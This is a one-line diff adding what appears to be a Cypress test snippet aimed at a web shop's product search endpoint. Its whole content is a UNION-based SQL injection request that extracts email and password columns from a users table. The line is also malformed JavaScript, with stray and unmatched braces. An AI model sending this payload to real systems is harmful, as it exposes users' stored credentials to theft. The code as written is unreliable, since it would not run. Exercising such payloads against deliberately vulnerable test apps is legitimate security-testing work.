@@ -1,0 +1,1 @@
+{cy.get('app-mat-search-bar input')} {cy.request( "/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--" )} })
